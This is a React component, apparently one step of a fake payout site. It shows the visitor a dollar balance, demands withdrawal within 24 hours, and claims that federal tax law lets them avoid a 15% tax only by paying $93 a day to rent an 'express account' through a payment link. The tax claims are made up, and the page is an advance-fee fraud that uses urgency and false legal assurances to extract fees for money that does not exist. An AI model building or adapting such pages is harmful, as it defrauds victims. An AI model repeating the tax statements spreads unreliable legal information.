import moment from "moment"
import { Text, Flex, Box, Icon, Image, Button } from "@chakra-ui/react"
import React, { useCallback } from "react"
import ChatCard from "../../components/ChatCard"
import { useSelector } from "react-redux"
import { thousandsFormatter, useGoTo } from "../../utils"
import FormCheckItem from "../../components/FormCheckItem"
import { COMMISSION_CADASTR_PAGE, COMMISSION_PAGE } from "../../constants"
import { useNavigate } from "react-router-dom"

const nextPage = `/${COMMISSION_PAGE}/${COMMISSION_CADASTR_PAGE}`
// 2-3
const Express = () => {
  const balance = useSelector(state => state.user.balance)

  const links = useSelector(state => state.data.links)

  // const goToNext = useGoTo()

  const navigate = useNavigate()

  const onClick = useCallback(() => {
    const link = links?.[22]

    if (!link) return

    if (String(link).includes("http")) {
      window.open(link, "_self")
    } else {
      navigate(link)
    }
  }, [links?.[22]])

  return (
    <ChatCard
      position={"relative"}
      minH={{ base: "calc(100vh - 112px)", sm: "fit-content" }}
      bodyStyles={{
        padding: { base: "40px 20px 20px", md: "30px" }
      }}
    >
      <Box
        display={"grid"}
        gridTemplateColumns={{ base: "1fr", md: "1fr 1fr" }}
        gridTemplateRows={{ base: "auto", md: "repeat(2, min-content)" }}
        gap={"30px"}
      >
        <Flex
          flexDir={{ base: "column", md: "row" }}
          alignItems={{ base: "center", md: "flex-start" }}
          gap={{ md: "30px" }}
        >
          <Box textAlign={{ base: "center", md: "left" }}>
            <Text fontSize={{ base: "20px", md: "24px" }} fontWeight={"600"}>
              Your payout amount is:
            </Text>
            <Text
              fontSize={{ base: "40px", md: "40px" }}
              fontWeight={"bold"}
              color={"brand.600"}
              background={"linear-gradient(180deg, #7B2FD0 0%, #414DED 100%)"}
              whiteSpace={"nowrap"}
              sx={{
                WebkitBackgroundClip: "text",
                WebkitTextFillColor: "transparent"
              }}
            >
              {`$${thousandsFormatter(balance)}`}
              <Text as={"span"} fontSize={"18px"}>
                {" "}
                USD
              </Text>
            </Text>
          </Box>
          <Text
            color={"pink.100"}
            fontSize={{ base: "16px", md: "20px" }}
            textAlign={{ base: "center", md: "left" }}
            width={{ md: "40%" }}
          >
            You need to withdraw money within 24 hours!
          </Text>
        </Flex>
        <Flex
          flexDir={"column"}
          justifyContent={{ md: "flex-start" }}
          gridRow={"span 2"}
        >
          <Text
            fontSize={{ base: "20px", md: "24px" }}
            fontWeight={"600"}
            textAlign={{ base: "center", md: "left" }}
          >
            Save on Taxes by Using Express Account
          </Text>
          <br />
          <Text fontSize={{ base: "16px", md: "20px" }}>
            Under <b>federal tax laws</b>, registering internet income requires
            the recipient (you) to pay a <b>15%</b> federal income tax on the
            total profit. However, if the profit is less than <b>$9075</b>, the
            taxpayer is exempt from paying the tax. To avoid paying income tax
            on the <b>${balance}</b> transfer, you can receive the funds as an{" "}
            <b>express transfer</b>. This is a <b>legal</b> provision that will
            allow you to save a significant <b>amount of money</b>.
          </Text>
        </Flex>
        <Flex flexDir={"column"} fontSize={"20px"}>
          <Text fontSize={"20px"} mb={"10px"}>
            To use this service, you need to{" "}
            <b>rent a reliable express account</b>. Once you have{" "}
            <b>rented the express account</b>, the funds will be transferred to
            the previously provided details. The{" "}
            <b>cost of renting an express account per day is $93</b>.
          </Text>
          <Flex flexDir={"column"} gap={"10px"} justifyContent={"flex-start"}>
            <FormCheckItem
              checked={true}
              label={"Pay for express account lease"}
            />
            <FormCheckItem
              checked={true}
              label={"Instant settlement will occur"}
            />
            <FormCheckItem checked={true} label={"Receive our runds"} />
          </Flex>
        </Flex>
      </Box>
      <Flex
        flexDir={{ base: "column-reverse", md: "row" }}
        justifyContent={{ md: "space-between" }}
        alignItems={"center"}
      >
        <Image
          src="./img/secure-payment.png"
          w={"120px"}
          margin={{ base: "50px auto", sm: "60px 0 0" }}
        />
        <Flex
          mt={"40px"}
          flexDir={{ base: "column", md: "row" }}
          alignItems={"center"}
        >
          <Button mb={"10px"} mr={{ md: "40px" }} onClick={onClick}>
            Pay for rental fee
          </Button>
        </Flex>
      </Flex>
    </ChatCard>
  )
}

export default Express
